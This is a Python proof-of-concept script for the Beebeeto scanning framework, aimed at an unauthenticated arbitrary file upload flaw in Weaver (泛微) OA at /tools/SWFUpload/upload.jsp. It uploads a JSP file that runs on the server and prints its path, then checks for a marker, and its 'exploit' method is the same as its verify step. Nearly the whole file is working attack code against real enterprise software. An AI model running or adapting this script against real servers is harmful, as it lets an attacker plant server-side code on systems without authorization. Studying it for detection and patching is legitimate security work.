#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0117',
            'name': '泛微 OA /tools/SWFUpload/upload.jsp 任意文件上传漏洞 PoC',
            'author': 'gurdzain',
            'create_date': '2015-07-01',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '泛微oa',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['泛微oa漏洞', '/tools/SWFUpload/upload.jsp', 'File Upload', 'jsp'],
            'desc': '''
                    http://xxx.xxx.xxx.xxx/tools/SWFUpload/upload.jsp
                    post:
                        type="file" name="test"
                    可以无需登录直接上传任意文件。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-076547'],
        },
    }

    @classmethod
    def verify(cls, args):
        target_url = args['options']['target'] + "/tools/SWFUpload/upload.jsp"
        verify_url = args['options']['target'] + "/nulltest.jsp"
        files = {'test':('test.jsp', r"""<%@ page import="java.util.*,java.io.*" %>
        <%@ page import="java.io.*"%>
        <%
        String path=application.getRealPath(request.getRequestURI());
        File d=new File(path);
        out.println(path);
        %>
        <% out.println("payload=true");%>""")}

        if args['options']['verbose']:
            print '[*] Request URL: ' + target_url

        req = requests.get(target_url,files=files)
        verify_req = requests.get(verify_url)
        content = verify_req.content

        if verify_req.status_code == 200 and 'payload=true' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())